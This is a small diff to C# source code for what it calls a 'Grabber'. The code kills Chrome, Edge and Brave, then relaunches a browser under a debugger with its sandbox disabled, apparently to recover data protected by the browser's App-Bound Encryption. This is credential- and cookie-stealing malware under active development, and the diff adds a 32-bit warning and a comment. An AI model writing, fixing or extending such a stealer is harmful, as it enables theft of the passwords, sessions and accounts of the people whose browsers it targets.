@@ -451,6 +451,11 @@ namespace ConsoleApp1
 
         public static void Execute(string zipPath)
         {
+            if (!Environment.Is64BitProcess)
+            {
+                Console.WriteLine("[!] Warning: Grabber is running as 32-bit. ABE recovery for 64-bit browsers may fail.");
+            }
+
             KillProcessesByName("chrome.exe");
             KillProcessesByName("msedge.exe");
             KillProcessesByName("brave.exe");
@@ -509,6 +514,7 @@ namespace ConsoleApp1
                 si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
+                // Use StringBuilder for lpCommandLine as it must be writable
                 StringBuilder cmdLine = new StringBuilder($"\"{exePath}\" --no-first-run --no-default-browser-check --no-sandbox --disable-gpu");
 
                 if (CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
